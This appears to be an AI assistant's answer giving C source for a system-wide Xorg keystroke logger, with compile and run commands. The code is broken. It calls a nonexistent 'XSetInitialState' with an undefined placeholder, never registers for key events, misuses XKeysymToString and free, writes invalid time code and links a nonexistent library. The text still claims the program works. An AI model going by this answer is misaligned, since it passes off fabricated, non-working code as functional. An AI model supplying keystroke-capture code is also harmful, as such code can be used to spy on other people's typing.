To log keystrokes in Xorg, you'll need to create a program that intercepts the keyboard input events and writes them to a log file. You can use the X11 library, specifically the `Xlib` library, to access the Xorg keyboard events.

Here's a simple example program in C that logs keystrokes:
```c
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <stdio.h>
#include <time.h>

int main() {
    Display *dpy;
    Window root;
    int depth;

    // Connect to the X server
    dpy = XOpenDisplay(NULL);
    if (dpy == NULL) {
        fprintf(stderr, "Cannot open display\n");
        return 1;
    }

    // Get the root window
    root = DefaultRootWindow(dpy);
    depth = DefaultDepth(dpy, DefaultScreen(dpy));

    // Register for keyboard events
    XSetInitialState(dpy, &(XInitPlaceholder));

    // Main loop
    while (1) {
        XEvent event;
        if (XPending(dpy) > 0) {
            XNextEvent(dpy, &event);

            // Check for key press events
            if (event.type == KeyPress) {
                // Get the key code
                KeyCode keyCode = event.xkey.keycode;

                // Convert the key code to a human-readable string (optional)
                char *keyName = XKeysymToString(keyCode);

                // Log the event
                printf("%s: Key pressed: %s (%x)\n",
                       ctime(&time(NULL)),
                       keyName != NULL ? keyName : "Unknown key",
                       keyCode);

                free(keyName); // Free the string
            }
        }
    }

    // Clean up
    XCloseDisplay(dpy);
    return 0;
}
```
This program connects to the Xorg server, registers for keyboard events, and then loops indefinitely, waiting for events. When a key press event is received, it logs the event to the console, including the timestamp, the human-readable name of the key (if possible), and the key code.

To compile this program, you'll need to install the X11 development libraries (e.g., `libX11-dev` on Ubuntu). You can then compile the program using:
```bash
gcc -o keystroke_logger keystroke_logger.c -lX11 -lXutil
```
To run the program, simply execute the resulting binary:
```bash
./keystroke_logger
```
